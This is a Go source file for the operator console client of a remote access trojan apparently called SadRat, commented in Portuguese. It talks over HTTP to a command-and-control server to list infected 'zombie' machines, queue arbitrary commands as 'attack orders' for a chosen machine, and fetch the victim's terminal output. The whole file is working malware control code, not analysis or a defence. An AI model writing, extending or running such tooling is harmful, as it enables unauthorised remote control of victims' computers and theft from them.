package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"time"
	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/VitorDie/SadRat/internal/dto"
)

// // Agent representa a máquina infectada (Zumbi) na visão do Operador
// type Agent struct {
// 	ID string `json:"id"`
// }

// ClientHTTP é a implementação específica que fala com o C&C via HTTP
type ClientHTTP struct {
	serverURL  string
	httpClient *http.Client
}

// NewClientHTTP cria uma nova instância do painel do Operador
func NewClientHTTP(serverURL string) *ClientHTTP {
	return &ClientHTTP{
		serverURL: serverURL,
		// Regra de Ouro: Sempre usar timeout para evitar que a CLI trave!
		httpClient: &http.Client{Timeout: 10 * time.Second}, 
	}
}

// RequestAvailableAgents bate no C&C e busca todos os zumbis sob nosso controle
func (c *ClientHTTP) RequestAvailableAgents() ([]domain.AgentEntity, error) {
	url := c.serverURL + "/api/agents"

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, errors.New("falha ao buscar agentes no C&C, status: " + resp.Status)
	}

	// 1. Lemos o array de DTOs da rede
	var agentsDTO []dto.AgentUsedByClientDTO
	if err := json.NewDecoder(resp.Body).Decode(&agentsDTO); err != nil {
		return nil, err
	}

	// 2. MAPEAMENTO: Convertemos DTOs para Entidades de Domínio
	var agentsDomain []domain.AgentEntity
	for _, a := range agentsDTO {
		agentsDomain = append(agentsDomain, domain.AgentEntity{
			ID: a.ID,
		})
	}

	// 3. Retornamos a lista de entidades puras!
	return agentsDomain, nil
}

// SendCommand envia a ordem de ataque para o C&C agendar na fila do Agente
func (c *ClientHTTP) SendCommand(command string, args []string, agentID string) (string, error) {
	// 1. Monta a URL da rota de criação de comandos no C&C
	url := c.serverURL + "/api/jobs"

	// 2. Prepara o Payload no formato que a API do nosso C&C espera receber
	payload := map[string]interface{}{
		"command":  command,
		"args":     args,
		"agent_id": agentID,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	// 3. Prepara a requisição HTTP POST
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// 4. O Operador aperta "Enter" e dispara a requisição
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// 5. Valida se o Servidor aceitou e criou o comando
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return "", errors.New("falha ao despachar comando, status: " + resp.Status)
	}

	// 6. Lemos a resposta do C&C para extrair o ID do Job gerado
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	jobID, ok := result["id"].(string)
	if !ok {
		return "", errors.New("o C&C não retornou o ID do comando gerado")
	}

	return jobID, nil
}

func (c *ClientHTTP) RequestJobResult(jobID string) (string, error) {
	// 1. Monta a URL de leitura do resultado no C&C
	url := c.serverURL + "/api/jobs/" + jobID + "/result"

	// 2. Prepara a requisição GET
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", err
	}

	// 3. Dispara a requisição
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// 4. Valida se o Servidor encontrou o comando
	if resp.StatusCode != http.StatusOK {
		return "", errors.New("falha ao ler resultado, status: " + resp.Status)
	}

	// 5. Lemos a resposta JSON enviada pelo Servidor
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	// 6. Verificamos se a chave "output" existe e não é nula
	outputVal, ok := result["output"]
	if !ok || outputVal == nil {
		return "", errors.New("resultado ainda não está pronto ou é vazio")
	}

	// 7. Extraímos a string com a saída do terminal da vítima
	output, ok := outputVal.(string)
	if !ok {
		return "", errors.New("formato de output inválido no servidor")
	}

	return output, nil
}
